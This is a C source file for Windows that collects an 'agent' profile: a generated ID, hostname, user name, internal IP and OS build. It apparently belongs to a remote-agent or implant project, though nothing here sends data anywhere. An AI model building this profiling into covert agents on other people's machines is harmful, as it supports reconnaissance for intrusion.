/*
 * sysinfo.c - Récupération des informations système
 */

#include <windows.h>
#include <winsock2.h>
#include <objbase.h>
#include <stdio.h>
#include <string.h>
#include "sysinfo.h"

int generate_uuid(char* buffer, size_t size) {
    GUID guid;

    if (CoCreateGuid(&guid) != S_OK) {
        DWORD tick = GetTickCount();
        snprintf(buffer, size, "%08lx-%04x-%04x-%04x-%012llx",
                 tick,
                 (unsigned short)(tick >> 16),
                 (unsigned short)(tick & 0xFFFF),
                 (unsigned short)((tick >> 8) & 0xFFFF),
                 (unsigned long long)tick * 12345678ULL);
        return 1;
    }

    snprintf(buffer, size, "%08lx-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x",
             guid.Data1,
             guid.Data2,
             guid.Data3,
             guid.Data4[0], guid.Data4[1],
             guid.Data4[2], guid.Data4[3],
             guid.Data4[4], guid.Data4[5],
             guid.Data4[6], guid.Data4[7]);

    return 1;
}

static int get_hostname(char* buffer, size_t size) {
    DWORD buf_size = (DWORD)size;

    if (GetComputerNameA(buffer, &buf_size)) {
        return 1;
    }

    strncpy(buffer, "unknown", size - 1);
    buffer[size - 1] = '\0';
    return 0;
}

static int get_username(char* buffer, size_t size) {
    DWORD buf_size = (DWORD)size;

    if (GetUserNameA(buffer, &buf_size)) {
        return 1;
    }

    strncpy(buffer, "unknown", size - 1);
    buffer[size - 1] = '\0';
    return 0;
}

static int get_internal_ip(char* buffer, size_t size) {
    WSADATA wsa;
    char hostname[256];
    struct hostent* host;
    struct in_addr addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        strncpy(buffer, "0.0.0.0", size - 1);
        return 0;
    }

    if (gethostname(hostname, sizeof(hostname)) != 0) {
        WSACleanup();
        strncpy(buffer, "0.0.0.0", size - 1);
        return 0;
    }

    host = gethostbyname(hostname);
    if (host == NULL) {
        WSACleanup();
        strncpy(buffer, "0.0.0.0", size - 1);
        return 0;
    }

    addr.s_addr = *(u_long*)host->h_addr_list[0];
    strncpy(buffer, inet_ntoa(addr), size - 1);
    buffer[size - 1] = '\0';

    return 1;
}

static int get_os_version(char* buffer, size_t size) {
    // RtlGetVersion ne ment pas contrairement à GetVersionEx
    typedef LONG (WINAPI *RtlGetVersionPtr)(POSVERSIONINFOW);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        strncpy(buffer, "Windows Unknown", size - 1);
        buffer[size - 1] = '\0';
        return 0;
    }

    RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    if (pRtlGetVersion == NULL) {
        strncpy(buffer, "Windows Unknown", size - 1);
        buffer[size - 1] = '\0';
        return 0;
    }

    OSVERSIONINFOW osvi;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    if (pRtlGetVersion(&osvi) == 0) {  // STATUS_SUCCESS = 0
        snprintf(buffer, size, "Windows %lu.%lu.%lu",
                 osvi.dwMajorVersion,
                 osvi.dwMinorVersion,
                 osvi.dwBuildNumber);
        return 1;
    }

    strncpy(buffer, "Windows Unknown", size - 1);
    buffer[size - 1] = '\0';
    return 0;
}

int get_system_info(AgentInfo* info) {
    if (info == NULL) {
        return 0;
    }

    ZeroMemory(info, sizeof(AgentInfo));

    generate_uuid(info->agent_id, sizeof(info->agent_id));
    get_hostname(info->hostname, sizeof(info->hostname));
    get_username(info->username, sizeof(info->username));
    get_internal_ip(info->internal_ip, sizeof(info->internal_ip));
    get_os_version(info->os_version, sizeof(info->os_version));

    return 1;
}